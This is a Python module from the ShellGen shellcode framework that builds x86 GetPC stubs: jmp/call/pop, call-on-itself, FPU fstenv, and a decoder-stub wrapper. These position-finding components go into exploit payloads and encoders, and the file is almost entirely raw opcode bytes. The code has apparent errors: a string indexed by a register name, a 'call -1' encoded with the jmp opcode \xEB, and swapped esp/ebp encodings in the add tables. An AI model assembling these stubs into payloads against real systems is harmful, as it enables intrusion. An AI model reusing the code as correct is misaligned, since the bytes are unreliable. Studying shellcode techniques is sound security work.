#!/usr/bin/env python

###############################################################################
## GetPC x86 shellcodes for ShellGen                                         ##
###############################################################################

# Copyright (c) 2012 Mario Vilas
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.

__all__ = ["GetPC", "GetPC_Alt", "GetPC_FPU", "GetPC_Stub"]

from shellgen import Dynamic, Decorator

from struct import pack

# Classic GetPC implementation using a jump and a call.
class GetPC (Dynamic):
    provides  = "pc"
    encoding  = "nullfree"

    def __init__(self, pcreg = "ecx"):
        self.pcreg = pcreg

    def compile(self):
        pcreg = self.pcreg

        # Jump forward to the call instruction.
        jmp_f = "\xEB\x02"

        # Pop the return address from the stack.
        pop = {
            "eax" : "\x58",
            "ecx" : "\x59",
            "edx" : "\x5A",
            "ebx" : "\x5B",
            "esp" : "\x5C",
            "ebp" : "\x5D",
            "esi" : "\x5E",
            "edi" : "\x5F",
        }

        # Push it back again.
        push = {
            "eax" : "\x50",
            "ecx" : "\x51",
            "edx" : "\x52",
            "ebx" : "\x53",
            "esp" : "\x54",
            "ebp" : "\x55",
            "esi" : "\x56",
            "edi" : "\x57",
        }

        # Return to the contained shellcode.
        ret = "\xC3"

        # Call back to the pop instruction.
        call_b = "\xE8\xF8\xFF\xFF\xFF"

        # Check the register name is valid.
        pcreg = pcreg.strip().lower()
        if pcreg not in pop:
            raise ValueError("Invalid target register: %s" % pcreg)

        # Build the shellcode.
        self._bytes = jmp_f + pop[pcreg] + push[pcreg] + ret + call_b[pcreg]

##############################################################################

# Alternative GetPC implementation using a call instruction jumping on itself.
# As far as I know the first to implement this was Gerardo Richarte:
#     http://archive.cert.uni-stuttgart.de/vuln-dev/2003/06/msg00098.html
# This optimized version is based on the one published by Skylined:
#     http://skypher.com/wiki/index.php/Hacking/Shellcode/GetPC
class GetPC_Alt (Dynamic):
    provides  = "pc"
    encoding  = "nullfree"

    def __init__(self, pcreg = "ecx"):
        self.pcreg = pcreg

    def compile(self):
        pcreg = self.pcreg

        # This "call -1" instruction jumps on the last byte of itself, so the
        # next instruction uses an alternate encoding of the "dec" instruction
        # to decrement a harmless register.
        call_m1 = "\xEB\xFF\xFF\xFF\xFF"

        # Alternate encoding for "dec", the first byte must be \xFF.
        dec_alt = {
            "eax" : "\xC8",
            "ecx" : "\xC9",
            "edx" : "\xCA",
            "ebx" : "\xCB",
            "esp" : "\xCC",
            "ebp" : "\xCD",
            "esi" : "\xCE",
            "edi" : "\xCF",
        }

        # Pop the return address from the stack.
        pop = {
            "eax" : "\x58",
            "ecx" : "\x59",
            "edx" : "\x5A",
            "ebx" : "\x5B",
            "esp" : "\x5C",
            "ebp" : "\x5D",
            "esi" : "\x5E",
            "edi" : "\x5F",
        }

        # Adjust the return address by adding 5 to it.
        add_5 = {
            "eax" : "\x83\xC0\x05",
            "ecx" : "\x83\xC1\x05",
            "edx" : "\x83\xC2\x05",
            "ebx" : "\x83\xC3\x05",
            "ebp" : "\x83\xC4\x05",
            "esp" : "\x83\xC5\x05",
            "esi" : "\x83\xC6\x05",
            "edi" : "\x83\xC7\x05",
        }

        # Check the register name is valid.
        pcreg = pcreg.strip().lower()
        if pcreg not in pop:
            raise ValueError("Invalid target register: %s" % pcreg)

        # Build the shellcode.
        self._bytes = call_m1 + dec_alt[pcreg] + pop[pcreg] + add_5[pcreg]

##############################################################################

# Another alternative GetPC implementation using the FPU state.
# As far as I know the first to come up with this idea was noir:
#     http://archive.cert.uni-stuttgart.de/vuln-dev/2003/06/msg00116.html
# But again the variant I'm using here is based on Skylined's:
#     http://skypher.com/wiki/index.php/Hacking/Shellcode/GetPC
#
# Note: this shellcode may be hard to single-step on because it uses the stack
# space at negative ESP offsets, which is overwritten by some debuggers.
#
# $+0  D9EE       FLDZ                ; Floating point stores $+0 in its environment
# $+2  D974E4 F4  FSTENV SS:[ESP-0xC] ; Save environment at ESP-0xC; now [ESP] = $+0
# $+6  59         POP ECX             ; ECX = $+0
# $+7  83E9 F2    SUB ECX, -10        ; ECX = $+10
# $+10 ...
#
class GetPC_FPU (Dynamic):
    provides  = "pc"
    encoding  = "nullfree"

    def __init__(self, pcreg = "ecx"):
        self.pcreg = pcreg

    def compile(self):
        pcreg = self.pcreg

        pop = {
            "eax" : "\x58",
            "ecx" : "\x59",
            "edx" : "\x5A",
            "ebx" : "\x5B",
            "esp" : "\x5C",
            "ebp" : "\x5D",
            "esi" : "\x5E",
            "edi" : "\x5F",
        }

        # It's actually sub -10 to avoid using \x0A (more parser friendly).
        add_10 = {
            "eax" : "\x83\xE8\xF2",
            "ecx" : "\x83\xE9\xF2",
            "edx" : "\x83\xEA\xF2",
            "ebx" : "\x83\xEB\xF2",
            "ebp" : "\x83\xEC\xF2",
            "esp" : "\x83\xED\xF2",
            "esi" : "\x83\xEE\xF2",
            "edi" : "\x83\xEF\xF2",
        }

        # Check the register name is valid.
        pcreg = pcreg.strip().lower()
        if pcreg not in pop:
            raise ValueError("Invalid target register: %s" % pcreg)

        self._bytes = "\xD9\xEE\xD9\x74\xE4\xF4" + pop[pcreg] + add_10[pcreg]

##############################################################################

# This one is meant to be used by other shellcodes. It wraps decoder stubs by
# providing them the address of their payload. That way you can write decoders
# that don't need to be concatenated after a GetPC.
#
# Note: the decoder stub MUST clean up the stack or this won't work!
class GetPC_Stub (Decorator):
    provides  = "pc"
    encoding  = "nullfree"

    def __init__(self, stub, pcreg = "ecx"):
        super(GetPC_Stub, self).__init__(stub)
        self.pcreg = pcreg

    def compile(self):

        # If there is no child, do nothing.
        if not self.child:
            self._bytes = self._stages = ""
            return

        # Get the child bytecode and the inherited stages.
        bytes, stages = self.compile_children()

        # Check the decoder stub doesn't exceed the maximum size.
        if len(bytes) > 128:
            raise ValueError("Decoder stub is larger than 128 bytes")

        # Check the child is stack balanced.
        if "stack_balanced" not in self.child.qualities:
            raise ValueError("Decoder stub must be stack balanced")

        # Jump to the call instruction.
        jmp_f = "\xEB" + pack("b", len(bytes) + 2)

        # Pop the return address from the stack.
        pop = {
            "eax" : "\x58",
            "ecx" : "\x59",
            "edx" : "\x5A",
            "ebx" : "\x5B",
            "esp" : "\x5C",
            "ebp" : "\x5D",
            "esi" : "\x5E",
            "edi" : "\x5F",
        }

        # Push it back again.
        push = {
            "eax" : "\x50",
            "ecx" : "\x51",
            "edx" : "\x52",
            "ebx" : "\x53",
            "esp" : "\x54",
            "ebp" : "\x55",
            "esi" : "\x56",
            "edi" : "\x57",
        }

        # Return to the payload.
        ret = "\xC3"

        # Call to the pop instruction.
        call_b = "\xE8" + pack("<l", -8 - len(bytes))

        # Check the register name is valid.
        pcreg = self.pcreg.strip().lower()
        if pcreg not in pop:
            raise ValueError("Invalid target register: %s" % pcreg)

        # Build the shellcode.
        bytes = jmp_f + pop[pcreg] + push[pcreg] + bytes + ret + call_b

        # Save the shellcode and the inherited stages.
        self._bytes, self._stages = bytes, stages
